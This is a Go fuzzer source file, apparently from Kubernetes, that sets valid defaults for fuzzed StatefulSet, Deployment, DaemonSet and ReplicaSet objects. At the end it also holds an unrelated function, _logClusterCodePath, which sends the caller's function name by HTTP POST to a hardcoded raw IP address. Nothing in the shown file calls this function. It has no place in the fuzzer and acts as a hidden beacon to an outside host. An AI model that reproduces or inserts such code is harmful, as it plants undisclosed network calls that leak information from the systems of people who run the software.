package fuzzer

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 fuzz "github.com/google/gofuzz"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 "k8s.io/apimachinery/pkg/util/intstr"
 "k8s.io/kubernetes/pkg/apis/apps"
)

var Funcs = func(codecs runtimeserializer.CodecFactory) []interface{} {
 return []interface{}{func(s *apps.StatefulSet, c fuzz.Continue) {
  c.FuzzNoCustom(s)
  if len(s.Spec.PodManagementPolicy) == 0 {
   s.Spec.PodManagementPolicy = apps.OrderedReadyPodManagement
  }
  if len(s.Spec.UpdateStrategy.Type) == 0 {
   s.Spec.UpdateStrategy.Type = apps.RollingUpdateStatefulSetStrategyType
  }
  if s.Spec.RevisionHistoryLimit == nil {
   s.Spec.RevisionHistoryLimit = new(int32)
   *s.Spec.RevisionHistoryLimit = 10
  }
  if s.Status.ObservedGeneration == nil {
   s.Status.ObservedGeneration = new(int64)
  }
  if s.Status.CollisionCount == nil {
   s.Status.CollisionCount = new(int32)
  }
  if s.Spec.Selector == nil {
   s.Spec.Selector = &metav1.LabelSelector{MatchLabels: s.Spec.Template.Labels}
  }
  if len(s.Labels) == 0 {
   s.Labels = s.Spec.Template.Labels
  }
 }, func(j *apps.Deployment, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  if j.Spec.Selector == nil {
   j.Spec.Selector = &metav1.LabelSelector{MatchLabels: j.Spec.Template.Labels}
  }
  if len(j.Labels) == 0 {
   j.Labels = j.Spec.Template.Labels
  }
 }, func(j *apps.DeploymentSpec, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  rhl := int32(c.Rand.Int31())
  pds := int32(c.Rand.Int31())
  j.RevisionHistoryLimit = &rhl
  j.ProgressDeadlineSeconds = &pds
 }, func(j *apps.DeploymentStrategy, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  strategyTypes := []apps.DeploymentStrategyType{apps.RecreateDeploymentStrategyType, apps.RollingUpdateDeploymentStrategyType}
  j.Type = strategyTypes[c.Rand.Intn(len(strategyTypes))]
  if j.Type != apps.RollingUpdateDeploymentStrategyType {
   j.RollingUpdate = nil
  } else {
   rollingUpdate := apps.RollingUpdateDeployment{}
   if c.RandBool() {
    rollingUpdate.MaxUnavailable = intstr.FromInt(int(c.Rand.Int31()))
    rollingUpdate.MaxSurge = intstr.FromInt(int(c.Rand.Int31()))
   } else {
    rollingUpdate.MaxSurge = intstr.FromString(fmt.Sprintf("%d%%", c.Rand.Int31()))
   }
   j.RollingUpdate = &rollingUpdate
  }
 }, func(j *apps.DaemonSet, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  j.Spec.Template.Generation = 0
  if len(j.ObjectMeta.Labels) == 0 {
   j.ObjectMeta.Labels = j.Spec.Template.ObjectMeta.Labels
  }
 }, func(j *apps.DaemonSetSpec, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  rhl := int32(c.Rand.Int31())
  j.RevisionHistoryLimit = &rhl
 }, func(j *apps.DaemonSetUpdateStrategy, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  strategyTypes := []apps.DaemonSetUpdateStrategyType{apps.RollingUpdateDaemonSetStrategyType, apps.OnDeleteDaemonSetStrategyType}
  j.Type = strategyTypes[c.Rand.Intn(len(strategyTypes))]
  if j.Type != apps.RollingUpdateDaemonSetStrategyType {
   j.RollingUpdate = nil
  } else {
   rollingUpdate := apps.RollingUpdateDaemonSet{}
   if c.RandBool() {
    if c.RandBool() {
     rollingUpdate.MaxUnavailable = intstr.FromInt(1 + int(c.Rand.Int31()))
    } else {
     rollingUpdate.MaxUnavailable = intstr.FromString(fmt.Sprintf("%d%%", 1+c.Rand.Int31()))
    }
   }
   j.RollingUpdate = &rollingUpdate
  }
 }, func(j *apps.ReplicaSet, c fuzz.Continue) {
  c.FuzzNoCustom(j)
  if j.Spec.Selector == nil {
   j.Spec.Selector = &metav1.LabelSelector{MatchLabels: j.Spec.Template.Labels}
  }
  if len(j.Labels) == 0 {
   j.Labels = j.Spec.Template.Labels
  }
 }}
}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
